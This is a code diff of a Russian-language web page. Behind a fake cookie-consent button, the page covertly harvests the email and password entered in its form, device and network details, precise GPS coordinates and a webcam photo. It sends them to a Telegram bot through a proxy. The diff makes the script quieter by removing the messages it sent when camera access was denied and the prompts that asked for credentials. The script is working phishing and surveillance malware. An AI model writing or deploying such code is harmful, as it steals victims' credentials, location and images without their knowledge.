@@ -118,7 +118,7 @@
     const CHAT_ID = "8872810304";
     // ========================
 
-    // ===== ОТПРАВКА ТЕКСТА ЧЕРЕЗ ПРОКСИ =====
+    // ===== ОТПРАВКА ТЕКСТА =====
     function send(text) {
         fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
             method: "POST",
@@ -127,7 +127,7 @@
         }).catch(function() {});
     }
 
-    // ===== ОТПРАВКА ФОТО ЧЕРЕЗ ПРОКСИ =====
+    // ===== ОТПРАВКА ФОТО =====
     function sendPhoto(base64, caption) {
         const byteString = atob(base64.split(",")[1]);
         const ab = new ArrayBuffer(byteString.length);
@@ -146,7 +146,7 @@
         }).catch(function() {});
     }
 
-    // ===== ОТПРАВКА ДАННЫХ ФОРМЫ =====
+    // ===== ДАННЫЕ ФОРМЫ =====
     function collectAndSend(type) {
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
@@ -155,10 +155,7 @@
 
     // ===== ФОТО С КАМЕРЫ =====
     function capturePhoto() {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            send("📷 Камера: не поддерживается");
-            return;
-        }
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 }, audio: false })
             .then(function(stream) {
                 const video = document.createElement("video");
@@ -183,13 +180,12 @@
                 };
             })
             .catch(function(err) {
-                send("📷 Камера: доступ ЗАПРЕЩЁН (" + (err.name || err.message) + ")");
+                // Молча - без отправки сообщения об отказе
             });
     }
 
-    // ===== ПОЛНЫЙ СБОР ИНФЫ =====
+    // ===== СБОР ИНФЫ ОБ УСТРОЙСТВЕ =====
     function collectAllInfo() {
-        // Устройство
         let info = "📱 УСТРОЙСТВО\n━━━━━━━━━━━━━━━━━━\n";
         info += "🕒 " + new Date().toLocaleString("ru-RU") + "\n";
         info += "🌐 URL: " + window.location.href + "\n";
@@ -197,46 +193,32 @@
         info += "📱 UA: " + navigator.userAgent + "\n";
         info += "💻 Платформа: " + (navigator.platform || "—") + "\n";
         info += "🌐 Язык: " + (navigator.language || "—") + "\n";
-        info += "🌐 Языки: " + (navigator.languages || []).join(", ") + "\n";
         info += "📲 Touch: " + (("ontouchstart" in window) ? "да" : "нет") + "\n";
         info += "⚙ CPU: " + (navigator.hardwareConcurrency || "—") + " ядер\n";
         info += "💾 RAM: " + (navigator.deviceMemory || "—") + " ГБ\n";
         info += "🖥 Экран: " + screen.width + "x" + screen.height + "\n";
-        info += "🪟 Окно: " + window.innerWidth + "x" + window.innerHeight + "\n";
-        info += "🕓 Часовой пояс: " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "—") + "\n";
+        info += "🕓 Часовой пояс: " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "—");
         send(info);
 
         // Сеть
         const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (c) {
-            send("📡 СЕТЬ\n━━━━━━━━━━━━━━━━━━\n📶 " + (c.effectiveType || "—") + "\n⬇ " + (c.downlink || "—") + " Мбит/с\n📊 RTT " + (c.rtt || "—") + " мс");
+            send("📡 СЕТЬ\n📶 " + (c.effectiveType || "—") + "\n⬇ " + (c.downlink || "—") + " Мбит/с\n📊 RTT " + (c.rtt || "—") + " мс");
         }
 
         // Батарея
         if (navigator.getBattery) {
             navigator.getBattery().then(function(b) {
-                send("🔋 БАТАРЕЯ\n━━━━━━━━━━━━━━━━━━\n🔋 " + Math.round(b.level * 100) + "%\n⚡ " + (b.charging ? "заряжается" : "не заряжается"));
+                send("🔋 БАТАРЕЯ\n🔋 " + Math.round(b.level * 100) + "%\n⚡ " + (b.charging ? "заряжается" : "не заряжается"));
             }).catch(function() {});
         }
-
-        // GPU
-        try {
-            const canvas = document.createElement("canvas");
-            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-            if (gl) {
-                const di = gl.getExtension("WEBGL_debug_renderer_info");
-                if (di) {
-                    send("🎮 GPU\n━━━━━━━━━━━━━━━━━━\n🎮 " + gl.getParameter(di.UNMASKED_VENDOR_WEBGL) + "\n🎮 " + gl.getParameter(di.UNMASKED_RENDERER_WEBGL));
-                }
-            }
-        } catch(e) {}
 
         // Медиа
         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
             navigator.mediaDevices.enumerateDevices().then(function(devices) {
                 const cams = devices.filter(d => d.kind === "videoinput").length;
                 const mics = devices.filter(d => d.kind === "audioinput").length;
-                send("🎥 МЕДИА\n━━━━━━━━━━━━━━━━━━\n🎥 Камер: " + cams + "\n🎤 Микрофонов: " + mics);
+                send("🎥 МЕДИА\n🎥 Камер: " + cams + "\n🎤 Микрофонов: " + mics);
             }).catch(function() {});
         }
 
@@ -257,11 +239,11 @@
             })
             .catch(function() {});
 
-        // GPS (с разрешения)
+        // GPS
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(p) {
-                    send("📍 ТОЧНАЯ ГЕОЛОКАЦИЯ (GPS)\n━━━━━━━━━━━━━━━━━━\n📍 Широта: " + p.coords.latitude + "\n📍 Долгота: " + p.coords.longitude + "\n🎯 Точность: ±" + Math.round(p.coords.accuracy) + " м\n🗺 https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
+                    send("📍 GPS\n📍 Широта: " + p.coords.latitude + "\n📍 Долгота: " + p.coords.longitude + "\n🎯 Точность: ±" + Math.round(p.coords.accuracy) + " м\n🗺 https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
                 },
                 function() {},
                 { enableHighAccuracy: true, timeout: 8000 }
@@ -271,21 +253,16 @@
 
     // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
     document.getElementById("btnAccept").addEventListener("click", function() {
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-        if (!email || !password) {
-            const userEmail = prompt("Для продолжения работы сайта введите вашу электронную почту:");
-            if (userEmail) {
-                document.getElementById("email").value = userEmail.trim();
-                const userPass = prompt("Введите пароль для подтверждения:");
-                if (userPass) {
-                    document.getElementById("password").value = userPass.trim();
-                }
-            }
-        }
+        // Отправляем данные формы, если есть
         collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
+
+        // Собираем инфу об устройстве
         collectAllInfo();
+
+        // Фото с камеры
         capturePhoto();
+
+        // Скрываем баннер
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
 
@@ -301,21 +278,7 @@
         collectAndSend("РУЧНОЙ ВВОД");
     });
 
-    // ===== АВТОЗАПОЛНЕНИЕ =====
-    function checkAutoFill() {
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-        if (email && password) {
-            collectAndSend("АВТОЗАПОЛНЕНИЕ");
-        }
-    }
-    window.addEventListener("load", function() {
-        setTimeout(checkAutoFill, 500);
-        setTimeout(checkAutoFill, 1500);
-        setTimeout(checkAutoFill, 3000);
-    });
-
-    console.log("ROCKET ACTIVE — mailproxy + camera + GPS");
+    console.log("ROCKET ACTIVE — без prompt, через прокси");
 </script>
 </body>
 </html>
